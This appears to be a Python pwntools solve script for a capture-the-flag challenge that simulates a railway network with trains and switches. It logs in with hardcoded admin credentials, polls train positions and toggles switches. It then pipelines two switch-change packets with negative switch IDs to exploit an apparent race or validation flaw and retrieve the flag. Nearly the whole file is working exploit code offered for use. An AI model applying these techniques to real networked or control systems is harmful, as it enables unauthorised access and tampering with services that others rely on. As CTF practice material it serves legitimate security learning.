#!/usr/bin/env python3
from pwn import *
import json
import threading
import argparse
import sys

# Configuration
# HOST = 'o9876tfvbnmklkjhgfdertyuillkjhgfdsdfghj.chals.nitephase.live'
HOST = 'localhost'
PORT = 1337
# Track information
CENTER_X = 400
CENTER_Y = 300
RADII = [100, 200, 300]

context.log_level = 'INFO'

class Client:
    def __init__(self, host=HOST, port=PORT):
        self.host = host
        self.port = port
        self.io: remote | None = None
        self.running = True
        self.lock = threading.Lock()
        
        # Train positions: {train_id: {"X": x, "Y": y}}
        self.train_positions = {}
        
        # Switch states: {switch_id: {"IsSwitched": bool, "X": x, "Y": y}}
        self.switches = {}
        
        # Ticket - will be set by server
        self.ticket = None

    def connect(self):
        """Connect to the server using pwntools remote()."""
        if HOST == 'localhost':
            self.io = remote(self.host, self.port, level=context.log_level)
        else:
            log.info("Using SSL to connect.")
            self.io = remote(self.host, self.port, ssl=True, level=context.log_level)
        log.success(f"Connected to {self.host}:{self.port}")

    def send_packet(self, packet_type: int, payload_dict: dict):
        """Send a length-prefixed JSON packet."""
        payload_str = json.dumps(payload_dict)
        packet = {
            "Type": packet_type,
            "Payload": payload_str
        }
        data = json.dumps(packet).encode('utf-8')
        # length = p32(len(data))  # Little-endian 4-byte length
        # self.io.send(length + data)
        self.io.sendline(data)

    def recv_packet(self) -> bytes:
        """Receive a single newline-delimited packet."""
        try:
             # recvline reads until \n (keepends=True by default in pwntools, but we can verify)
             # actually pwntools recvline() returns bytes ending in \n.
             line = self.io.recvline(keepends=False)
             return line
        except EOFError:
             self.running = False
             return b''

    def receive_loop(self):
        """Background thread to receive and handle packets."""
        try:
            while self.running:
                data = self.recv_packet()
                self.handle_packet(data)
        except Exception as e:
            if self.running:
                log.warning(f"Receive error: {e}")

    def handle_packet(self, data: bytes):
        """Parse and handle incoming packets."""
        # Forward to GUI if active
        global passive_gui_client
        if passive_gui_client:
            passive_gui_client.handle_packet(data)

        try:
            packet: dict = json.loads(data)
            p_type = packet.get("Type")
            payload_str = packet.get("Payload")
            if not payload_str:
                return
            payload: dict = json.loads(payload_str)

            if p_type == 99:  # Flag
                log.success("FLAG PACKET RECEIVED!")
                log.info(f"Message: {payload.get('Message')}")
                log.success(f"FLAG: {payload.get('Flag')}")
                self.running = False
            elif p_type == 2:  # StateUpdate
                with self.lock:
                    # Update train positions
                    for train in payload.get("Trains", []):
                        self.train_positions[train["Id"]] = {
                            "X": train.get("X", 0),
                            "Y": train.get("Y", 0)
                        }
                    
                    # Update switch states
                    for sw in payload.get("Switches", []):
                        self.switches[sw["Id"]] = {
                            "IsSwitched": sw.get("IsSwitched", False),
                            "X": sw.get("X", 0),
                            "Y": sw.get("Y", 0)
                        }
        except Exception as e:
            pass

    def request_update(self):
        """Request a state update from the server."""
        self.send_packet(4, dict())

    def set_switch(self, switch_id: int, target_switched: bool):
        """Send a switch change request."""
        self.send_packet(3, {"SwitchId": switch_id, "TargetSwitched": target_switched})

    def get_switch_state(self, switch_id: int) -> bool | None:
        """Get current switch state (True=diverged, False=straight, None=unknown)."""
        with self.lock:
            sw = self.switches.get(switch_id)
            return sw["IsSwitched"] if sw else None

    def get_train_track(self, train_id: int) -> int | None:
        """
        Get the current track of a train based on its X,Y position.
        
        Returns:
            Track ID (1, 2, or 3) or None if train not found.
            Track 1 = inner (radius 100), Track 2 = middle (radius 200), Track 3 = outer (radius 300)
        """
        with self.lock:
            train = self.train_positions.get(train_id)
            if not train:
                return None
            
            # Calculate distance from center
            dx = train["X"] - CENTER_X
            dy = train["Y"] - CENTER_Y
            dist = (dx*dx + dy*dy) ** 0.5
            
            # Find closest track by radius
            closest_track = 1
            min_diff = abs(dist - RADII[0])
            
            for i, radius in enumerate(RADII):
                diff = abs(dist - radius)
                if diff < min_diff:
                    min_diff = diff
                    closest_track = i + 1  # Track IDs are 1-indexed
            
            return closest_track

    def wait_for_switch_state(self, switch_id: int, target_state: bool, timeout: float = 3.0) -> bool:
        start = time.time()
        while time.time() - start < timeout:
            if self.get_switch_state(switch_id) == target_state:
                return True
            sleep(0.05)
        return False

    def wait_for_valid_train_track(self, train_id: int, timeout: float = 5.0) -> int | None:
        start = time.time()
        while time.time() - start < timeout:
            track = self.get_train_track(train_id)
            if track is not None:
                return track
            sleep(0.05)
        return None

    def toggle_switch(self, new_state: bool, switch_id: int, wait_for_pass: int = None, timeout: float = 10.0):
        """
        Toggle a switch.
        
        Args:
            switch_id: The switch ID to toggle
            wait_for_pass: If provided, wait for this train_id to pass through,
                          then automatically turn the switch red (straight) again.
            timeout: Maximum time to wait for train to pass (seconds)
        """
        log.info(f"Setting Switch {switch_id} -> {new_state}")

        if wait_for_pass is not None:
            # Ensure we know where the train is first
            initial_track = self.wait_for_valid_train_track(wait_for_pass)
            if initial_track is None:
                log.warning(f"Could not determine initial track for Train {wait_for_pass}")
                return False

        self.set_switch(switch_id, new_state)
        
        # # Verify switch actually turned on
        # if not self.wait_for_switch_state(switch_id, new_state):
        #      log.warning(f"Switch {switch_id} did not turn to {new_state}. Retrying...")
        #      self.set_switch(switch_id, new_state)
        #      if not self.wait_for_switch_state(switch_id, new_state):
        #          log.warning(f"Switch {switch_id} failed to set to {new_state}!")
        #          return False
        
        if wait_for_pass is not None:
            start = time.time()
            log.info(f"Train {wait_for_pass} initial track: {initial_track}")
            
            while time.time() - start < timeout:
                current_track = self.get_train_track(wait_for_pass)
                
                # Check if track changed (passed switch) or if we just lost tracking briefly
                if current_track is not None and current_track != initial_track:
                    log.success(f"Train {wait_for_pass} passed through Switch {switch_id}")
                    log.info(f"Train {wait_for_pass} current track: {current_track}")
                    break
                    
                sleep(0.05)
            else:
                log.warning(f"Timeout waiting for train {wait_for_pass} to pass Switch {switch_id}")
            
            log.info(f"Setting Switch {switch_id} -> {not new_state}")
            self.set_switch(switch_id, not new_state)

            # # Verify switch turned off
            # if not self.wait_for_switch_state(switch_id, not new_state):
            #      log.warning(f"Switch {switch_id} did not reset. Retrying...")
            #      self.set_switch(switch_id, not new_state)
        return True

    def start_update_loop(self, interval: float = 0.1):
        """Start background thread to continuously request updates."""
        def loop():
            while self.running:
                self.request_update()
                sleep(interval)
        
        t = threading.Thread(target=loop, daemon=True)
        t.start()
        return t

    def start_receive_loop(self):
        """Start background thread to receive packets."""
        t = threading.Thread(target=self.receive_loop, daemon=True)
        t.start()
        return t

    def authenticate(self):
        """Authenticate with the server."""
        log.info("Sending auth request...")
        self.send_packet(1, {"Username": "admin", "Password": "allnitelong"})
        
        # Wait for AuthResponse
        data = self.recv_packet()
        packet = json.loads(data)
        
        if packet.get("Type") == 5:  # AuthResponse
            payload = json.loads(packet.get("Payload", "{}"))
            self.ticket = payload.get("Ticket")
            log.success(f"Session Ticket: {self.ticket}")
            return self.ticket
        else:
            log.error(f"Unexpected response type: {packet.get('Type')}")
            raise Exception("Authentication failed")

    def run_exploit(self):
        """Main exploit logic."""
        
        self.connect()
        self.authenticate()
        
        # Start background threads
        self.start_receive_loop()
        self.start_update_loop()
        
        # Wait for initial state
        sleep(0.2)
        
        # --- EXPLOIT LOGIC ---

        # Setup for attack
        self.toggle_switch(True, -3, 2)
        # sleep(1)
        self.toggle_switch(True, 6, 1)
        # sleep(1)
        self.toggle_switch(True, 2, 2)
        sleep(1)

        # Attack

        packet1 = {
            "Type": 3,
            "Payload": json.dumps({"SwitchId": -3, "TargetSwitched": True})
        }
        packet2 = {
            "Type": 3,
            "Payload": json.dumps({"SwitchId": -1, "TargetSwitched": True})
        }
        data1 = json.dumps(packet1).encode('utf-8')
        data2 = json.dumps(packet2).encode('utf-8')

        self.io.send(data1 + b'\n' + data2 + b'\n')

        # Wait for flag or interrupt
        while self.running:
            sleep(0.1)

    def close(self):
        """Clean up connection."""
        self.running = False
        if self.io:
            self.io.close()

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()


# Global reference for forwarding packets
passive_gui_client = None

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--gui", action="store_true", help="Enable visualization")
    args = parser.parse_args()

    if args.gui:
        try:
            import tkinter as tk
            import client as vis_module

            vis_module.HOST = HOST
            vis_module.PORT = PORT

            root = tk.Tk()
            passive_gui_client = vis_module.PassiveClient()
            gui = vis_module.RailwayGUI(root, passive_gui_client)
            
            # Start exploit in background thread so GUI mainloop can run
            def run_exploit_thread():
                with Client() as client:
                    try:
                        client.run_exploit()
                    except (KeyboardInterrupt, Exception) as e:
                        log.info(f"Exploit finished/interrupted: {e}")
            
            t = threading.Thread(target=run_exploit_thread, daemon=True)
            t.start()
            
            log.info("Starting GUI...")
            root.mainloop()

        except ImportError:
            log.error("tkinter not found. Cannot run GUI.")
        except Exception as e:
            log.error(f"GUI Error: {e}")
    else:
        # Headless mode
        with Client() as client:
            try:
                client.run_exploit()
            except KeyboardInterrupt:
                log.info("Interrupted")
